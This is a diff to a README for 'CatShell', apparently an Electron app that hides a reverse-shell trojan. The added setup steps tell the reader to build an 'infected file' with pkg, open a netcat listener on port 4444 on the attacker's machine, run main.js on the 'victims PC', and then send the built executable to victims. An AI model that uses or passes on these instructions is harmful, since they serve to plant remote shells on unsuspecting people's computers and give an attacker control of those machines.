@@ -27,7 +27,11 @@ When you start the executable a script will be executed at the same moment the "
 <br><br>
 ### How to use & edit
 <br><br>
-- You will need first to install libraries with `npm -i` from inside the CatShell folder
+- You will need first to install libraries with `npm -i` from inside the CatShell folder and then install the pkg package with `sudo npm i pkg -g`
+
+-You will need to build the "infected file" with the command : `pkg ressources.js`
 
 - Start Tailwind from the folder with the command `npx tailwindcss -i ./src/input.css -o ./src/output.css --watch` to get the electron website working properly
-- try to run the app with the command ``
+
+- First, on the pc you want to get the shell from the victim, just start ncat with the command : `nc -l 4444`, 
+start the main.js file with the command : 'node main.js' on the victims PC . If everything is working up, you can build the main.js file with the command : `` and then start sending it to your victims.
